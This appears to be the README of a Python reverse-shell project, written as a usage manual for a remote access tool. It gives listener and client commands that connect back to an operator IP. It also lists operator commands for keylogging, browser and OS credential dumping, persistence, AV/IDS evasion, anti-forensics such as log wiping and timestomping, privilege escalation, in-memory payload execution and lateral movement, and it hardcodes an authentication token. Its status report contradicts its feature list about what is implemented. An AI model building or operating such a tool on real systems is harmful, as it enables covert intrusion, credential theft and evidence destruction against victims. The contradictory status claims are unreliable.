Reverse Shell Generator Project
=============================

**Project Summary:**
A reverse shell is a type of shell where the target machine initiates a connection to an attacker's machine, allowing the attacker to execute commands remotely. This is commonly used in penetration testing and red team operations to simulate real-world attacks and test defenses.

**How It Works:**
- The attacker sets up a listener (server) on their machine.
- The target (victim) runs a payload that connects back to the attacker's listener.
- The attacker can then send commands to the target and receive output.

**Detection & Prevention:**
- Firewalls: Block outbound connections to unknown IPs/ports.
- IDS/IPS: Detect suspicious network activity.
- Antivirus: Flag known reverse shell payloads.
- Network Monitoring: Alert on unusual traffic patterns.

**Initial Plan:**
- Start with a simple TCP-based reverse shell in Python 3.
- Target OS: Linux (easiest to test and extend).
- Modular design for future features (encryption, obfuscation, multi-platform support).

**Ethical Use Only:**
This tool is for educational and authorized penetration testing purposes only. Never use on systems without explicit permission. 

---

**Shared Secret Authentication:**

- This reverse shell uses a shared secret token for authentication between the client and the listener.
- The current shared secret token is:

  SuperSecretToken123

- The client must send this token immediately after connecting. If the token is incorrect, the listener will close the connection and refuse access.
- This token is required for all connections and will be used for all future features as well.

*For best security, change the shared secret in both the client and listener scripts before using in a real environment.*

---

**Testing the Reverse Shell (Linux, TCP, Python 3):**

1. Open two terminal windows (or use two VMs/hosts on the same network).

2. In the first terminal (attacker/listener):
   - Navigate to the project directory.
   - Run the listener script:
     
     python3 reverse_shell_listener.py <your_ip> <port>
     
     Example:
     python3 reverse_shell_listener.py 192.168.1.100 4444

3. In the second terminal (target/client):
   - Navigate to the project directory.
   - Run the client script:
     
     python3 reverse_shell_client.py <attacker_ip> <port>
     
     Example:
     python3 reverse_shell_client.py 192.168.1.100 4444

4. Once the connection is established, you can type commands in the listener terminal and see the output from the client.

5. Type 'exit' in the listener to close the connection.

**Note:**
- Only test in a controlled environment (e.g., VMs, lab network).
- Ensure firewalls allow traffic on the chosen port.
- Never use on unauthorized systems. 

---

**File Transfer (Upload/Download):**

- The reverse shell supports secure file upload and download between the listener and the client.

- Usage from the listener (after selecting a session):

  - Upload a file to the client:
    upload <local_path> <remote_path>
    (Sends a file from the attacker's machine to the target)

  - Download a file from the client:
    download <remote_path> <local_path>
    (Retrieves a file from the target and saves it on the attacker's machine)

- All file transfers are encrypted and authenticated over the SSL/TLS channel.

- Example:
    upload /home/attacker/test.txt /tmp/test.txt
    download /etc/passwd ./passwd_copy

---

*All features will be tested at the end, one at a time, to ensure full functionality and security.* 

---

**Obfuscation & Evasion Features:**

- All command and file data sent between the listener and client is base64-encoded.
  - This helps evade simple network inspection and some AV/IDS signatures.
- The client introduces a random delay (0–2 seconds) before sending any response.
  - This makes detection by timing analysis more difficult.
- These features are enabled by default for all communication and file transfers.

*Obfuscation and evasion are for educational and red team use only. They are not guaranteed to bypass advanced security solutions.*

---

**Persistence Feature:**

- The reverse shell client supports optional persistence, which can be triggered by the operator from the listener.
- Usage from the listener (after selecting a session):

  persist

- When the 'persist' command is sent:
  - On Windows: The client adds itself to the registry 'Run' key for automatic startup on user login.
  - On Linux: The client adds itself to the user's crontab with an '@reboot' entry for automatic startup.
- The client will respond with a success or error message.
- Persistence is not supported on MacOS in this version. A marker is present in the code for easy extension if MacOS support is needed in the future.

**Requirements:**
- On Linux, the python-crontab module must be installed for crontab support.
- On Windows, the client must have permission to modify the registry.

*Persistence is optional and only activated by the operator. Use with caution and only in authorized environments.* 

---

**Logging Feature:**

- Both the listener and client log important events to timestamped log files in the project directory.
- The listener logs:
  - All connection attempts and authentication results
  - All commands sent to sessions
  - All outputs received from sessions
- The client logs:
  - All commands received from the listener
  - All outputs sent back to the listener
- Log files are named with the current date and time (e.g., listener_log_YYYYMMDD_HHMMSS.txt).
- Use these logs for auditing, analysis, and reporting during red team operations or testing. 

---

**Keylogger Feature:**

- The reverse shell supports remote keylogging on the client machine.
- Usage from the listener (after selecting a session):
  - `keylog_start` — Start the keylogger on the client.
  - `keylog_stop` — Stop the keylogger.
  - `keylog_dump <local_path>` — Download the keylog file to the specified path.
- The client uses the `pynput` library to log keystrokes in the background.
- The keylog file is sent as a base64-encoded download.

**Requirements:**
- The `pynput` Python package must be installed on the client.

**Ethical Warning:**
- Keylogging is highly sensitive and should only be used in authorized, controlled environments for red team, research, or educational purposes. Never use on unauthorized systems or without explicit permission. 

---

**Investigation & Reconnaissance Features:**

The reverse shell now supports a comprehensive set of investigation commands for situational awareness and post-exploitation. All commands are issued from the listener after selecting a session.

- `netinfo` — Gather detailed network information (local IPs, interfaces, routing table, open ports).
- `sysinfo` — Get system information (OS, hostname, architecture, uptime, etc.).
- `users` — Enumerate users (all users, current user, groups).
- `ps` — List all running processes.
- `ls <path>` — List files and directories at the specified path.
- `find <pattern>` — Search for files matching a pattern (e.g., `find *.txt` or `find password`).
- `tasks` — List scheduled tasks (Windows Task Scheduler or Linux crontab).
- `services` — List running and stopped services/daemons.
- `av` — Detect installed antivirus/security products.
- `netstat` — List current network connections and listening ports.
- `recent` — List recently accessed files, shell history, and browser history.

**Usage Examples:**

- `netinfo` — Show network interfaces, routing table, and open ports.
- `sysinfo` — Show OS, architecture, uptime, etc.
- `users` — List all users and groups.
- `ps` — Show all running processes.
- `ls /home/user` — List files in `/home/user`.
- `find *.docx` — Find all Word documents.
- `tasks` — Show scheduled tasks or crontab entries.
- `services` — List all services/daemons.
- `av` — Detect installed antivirus.
- `netstat` — Show network connections.
- `recent` — Show recent files, shell, and browser history.

*All investigation features are for authorized, ethical use only. Results are returned in the listener shell for review and further action.* 

---

**Self-Destruct Feature:**

- The reverse shell client supports a self-destruct command to erase all traces from the target system.
- Usage from the listener (after selecting a session):

  selfdestruct

- When the 'selfdestruct' command is sent:
  - The client removes persistence (registry or crontab entry).
  - Deletes all client log files.
  - Overwrites its own file with random data and deletes itself.
  - Exits the process immediately.
- The client will respond with a confirmation message before exiting.

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Privilege Escalation Feature:**

- The reverse shell client supports a privilege escalation command to attempt running as Administrator (Windows) or root (Linux).
- Usage from the listener (after selecting a session):

  elevate

- When the 'elevate' command is sent:
  - On Windows: The client checks if it is already running as Administrator. If not, it attempts to relaunch itself with a UAC prompt for elevation.
  - On Linux: The client checks if it is already running as root. If not, it attempts to relaunch itself with sudo.
  - The client will respond with a success, failure, or error message.

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**In-Memory Payload Execution:**

- The reverse shell client supports in-memory execution of code/scripts without writing to disk.
- Usage from the listener (after selecting a session):

  execmem <language> <base64_payload>

- Supported languages:
  - python: Executes Python code in memory (cross-platform)
  - powershell: Executes PowerShell scripts in memory (Windows only)
  - shellcode: (stub for future extension)

- Example (Python):
  - Encode your Python code as base64, then run:
    execmem python <base64_payload>

- Example (PowerShell, Windows):
  - Encode your PowerShell script as base64, then run:
    execmem powershell <base64_payload>

- The client will execute the code in memory and return the result or any error message.

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Command Output Streaming:**

- The reverse shell client supports real-time streaming of command output for long-running or verbose commands.
- Usage from the listener (after selecting a session):

  stream <command>

- The client will execute the command and stream output back to the listener as it is produced, line by line.
- The listener displays streamed output in real time until the command completes.

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Interactive TTY/PTY Upgrade:**

- The reverse shell client supports upgrading to a fully interactive PTY shell (Linux only).
- Usage from the listener (after selecting a session):

  upgrade_pty

- The client will spawn a PTY shell and relay input/output, allowing the use of interactive programs (e.g., nano, top, ssh).
- Type `exit` in the PTY shell to return to the normal session.
- On Windows, this feature is not yet supported (stub for future extension).

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Plugin/Module System:**

- The reverse shell client supports a plugin/module system for extensibility.
- Plugins are Python scripts placed in the `plugins/` directory on the client.
- Each plugin must define a `run(args)` function.

**Plugin Commands (from the listener, after selecting a session):**
- `list_plugins` — List available plugins on the client
- `load_plugin <plugin_name>` — Load a plugin by name
- `run_plugin <plugin_name> [args]` — Run a loaded plugin with optional arguments

**Example Plugin (`plugins/hello.py`):**
```python
# plugins/hello.py
def run(args):
    return f"Hello, {args}!"
```

**Example Usage:**
- `list_plugins`
- `load_plugin hello`
- `run_plugin hello World`

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Reverse Port Forwarding & SOCKS Proxy:**

- The reverse shell client supports reverse port forwarding and a SOCKS5 proxy for network pivoting and tunneling.

**Reverse Port Forwarding:**
- Usage from the listener (after selecting a session):

  rpfwd <local_port> <remote_host> <remote_port>

- The client listens on <local_port> and forwards connections to <remote_host>:<remote_port> through the compromised host.

**SOCKS Proxy:**
- Usage from the listener (after selecting a session):

  socks

- The client starts a SOCKS5 proxy on port 1080, allowing the operator to tunnel arbitrary TCP traffic through the compromised host.

*These features are for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Alternate C2 Channels (HTTP/S, DNS, ICMP):**

- The reverse shell client supports alternate command-and-control (C2) channels for stealth and flexibility.

**HTTP/S C2:**
- Usage from the listener (after selecting a session):

  c2_http <url>

- The client will poll the specified URL for commands and post results back. (Requires a compatible HTTP C2 server.)

**DNS C2:**
- Usage from the listener (after selecting a session):

  c2_dns <domain>

- (Stub) The client will use DNS queries for C2. (Not yet implemented.)

**ICMP C2:**
- Usage from the listener (after selecting a session):

  c2_icmp <host>

- (Stub) The client will use ICMP echo requests/replies for C2. (Not yet implemented.)

*These features are for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Automated Lateral Movement:**

- The reverse shell client supports automated lateral movement for red team operations.

**Commands (from the listener, after selecting a session):**
- `lateral_move scan` — Scan the local subnet for live hosts
- `lateral_move exploit <ip>` — Attempt a simple exploit on a discovered host (stub for future extension)
- `lateral_move report` — Return a summary of discovered hosts and attempted exploits

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Persistence Variants & Fileless Persistence:**

- The reverse shell client supports multiple persistence options for maintaining access.

**Commands (from the listener, after selecting a session):**
- `persist_task` — Add persistence via scheduled task (Windows) or systemd (Linux)
- `persist_wmi` — Add persistence via WMI event consumer (Windows, stub)
- `persist_fileless` — Attempt fileless persistence (stub/POC)
- `persist_status` — Report all current persistence methods

*These features are for authorized red team and research use only. Use with caution and only in controlled environments.* 

---

**Anti-Forensics:**

- The reverse shell client supports anti-forensics features to hinder investigation and analysis.

**Commands (from the listener, after selecting a session):**
- `wipe_logs` — Delete all logs created by the client
- `timestomp <file> [ref_file|timestamp]` — Set file timestamps to match another file or a specified time
- `secure_erase <file>` — Overwrite and delete a file securely

*These features are for authorized red team and research use only. Use with caution and only in controlled environments. Use of anti-forensics may be illegal or unethical in some contexts.* 

---

**Continuous Clipboard Monitoring:**

- The reverse shell client supports continuous clipboard monitoring to log clipboard changes in real time.

**Commands (from the listener, after selecting a session):**
- `clipboard_monitor start` — Start monitoring clipboard changes
- `clipboard_monitor stop` — Stop monitoring
- `clipboard_monitor dump` — Download clipboard change log

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments. Clipboard monitoring may capture sensitive or personal data.*

---

**Credential Dumping:**

- The reverse shell client supports credential dumping from common browsers and OS stores.

**Sources:**
- Chrome, Chromium, Edge, Opera (user passwords)
- Firefox (logins.json)
- Windows Credential Manager
- Linux keyrings (Gnome Keyring, KWallet)

**Command (from the listener, after selecting a session):**
- `creds_dump` — Extract credentials from all available sources and return as JSON

*This feature is for authorized red team and research use only. Use with caution and only in controlled environments. Credential dumping may be illegal or unethical in some contexts.*

---

# Temporary Program Report (Project Status)

**Completed Features:**
- Multi-session SSL/TLS listener and client
- Shared secret authentication
- File upload/download (encrypted, base64, SSL/TLS)
- Logging (client and listener)
- Keylogger (start/stop/dump)
- Screenshot and webcam capture
- Clipboard access
- Obfuscation (base64, random delay)
- Persistence (registry, crontab, scheduled task, systemd)
- Self-destruct (secure erase, log wipe, remove persistence)
- Privilege escalation (admin/root)
- In-memory payload execution (Python, PowerShell)
- Command output streaming
- Interactive TTY/PTY upgrade (Linux)
- Plugin/module system
- Reverse port forwarding & SOCKS5 proxy
- Alternate C2 channels (HTTP/S, DNS, ICMP stubs)
- Automated lateral movement (scan, exploit stub, report)
- Anti-forensics (log wipe, timestomp, secure erase)
- Investigation/recon commands (netinfo, sysinfo, users, ps, ls, find, tasks, services, av, netstat, recent)

**In Progress:**
- Continuous clipboard monitoring (start/stop, log changes)

**Planned/Not Yet Implemented:**
- Credential dumping (browser, OS, keyrings)
- Screen recording (video)
- Multi-platform support (MacOS, Android)
- GUI listener
- Full-featured fileless persistence
- WMI persistence (Windows)
- Advanced lateral movement (real exploits, credential reuse)
- Alternate C2 channels (fully functional DNS, ICMP)
- More plugin examples and plugin management

*This section is a live project status snapshot. Remove or update as needed.* 

---

**GUI Listener (Planned):**

- A graphical user interface (GUI) for the listener is planned for future development (e.g., using PyQt or Tkinter).
- The GUI will allow session management, command execution, and log viewing in a user-friendly way.
- For now, use the command-line listener for all operations. 